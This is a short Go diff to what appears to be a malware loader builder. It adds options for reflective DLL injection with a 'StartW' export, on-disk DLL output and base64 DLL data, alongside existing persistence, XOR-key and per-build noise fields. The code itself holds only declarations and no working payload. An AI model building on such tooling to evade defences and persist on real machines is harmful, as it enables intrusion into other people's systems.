@@ -8,8 +8,9 @@ import (
 )
 
 const (
-	MaxPayload = 64 << 20
-	PersistOff = "off"
+	MaxPayload       = 64 << 20
+	PersistOff       = "off"
+	DefaultRDIExport = "StartW"
 )
 
 // Options is a compile-on-host loader build.
@@ -22,6 +23,9 @@ type Options struct {
 	Persistence string
 	PersistName string
 	XORKey      string
+	DiskDLL     bool
+	DLLName     string
+	Export      string
 	// Per-build uniqueness, filled by Build. Not API inputs.
 	Nonce   []byte
 	Noise   []byte
@@ -40,6 +44,9 @@ type Result struct {
 	Persistence string `json:"persistence"`
 	RDI         bool   `json:"rdi"`
 	PayloadSize int    `json:"payload_size"`
+	Engine      string `json:"engine"`
+	DllFilename string `json:"dll_filename,omitempty"`
+	DllDataB64  string `json:"dll_data_b64,omitempty"`
 }
 
 var persistByOS = map[string][]string{
